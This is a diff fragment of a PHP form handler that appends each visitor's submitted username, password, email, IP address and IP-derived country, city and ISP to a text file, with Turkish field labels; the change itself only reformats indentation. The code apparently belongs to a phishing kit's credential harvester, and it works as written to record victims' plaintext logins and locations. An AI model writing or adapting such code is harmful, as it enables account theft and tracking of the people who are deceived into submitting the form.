@@ -28,29 +28,29 @@ if(isset($_POST))
                 $json = json_decode($output, true);
                 
                 $dosya = fopen("baris-altay.txt", "a");
-                fwrite($dosya, "
-                \$_KULLANICI_ADI : " . $_POST['username'] . "
-                
-                \$_SIFRE         : " . $_POST['password'] . "
+fwrite($dosya, "
+\$_KULLANICI_ADI : " . $_POST['username'] . "
 
-                \$_EPOSTA         : " . $_POST['email'] . "
-               
-                \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
-                
-                \$_ULKE          : " . $json['country'] . "
-                
-                \$_SEHIR         : " . $json['regionName'] . "
-                
-                \$_ILCE          : " . $json['city'] . "
-                
-                \$_ISP           : " . $json['isp'] . "
-                
-                \$_KATEGORI      : " . $_POST['category'] . "
-                
+\$_SIFRE         : " . $_POST['password'] . "
 
-                
-                
-                ");
+\$_EPOSTA         : " . $_POST['email'] . "
+
+\$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
+
+\$_ULKE          : " . $json['country'] . "
+
+\$_SEHIR         : " . $json['regionName'] . "
+
+\$_ILCE          : " . $json['city'] . "
+
+\$_ISP           : " . $json['isp'] . "
+
+\$_KATEGORI      : " . $_POST['category'] . "
+
+
+
+
+");
                 fclose($dosya);
 
                 $data["success"] = "Success";
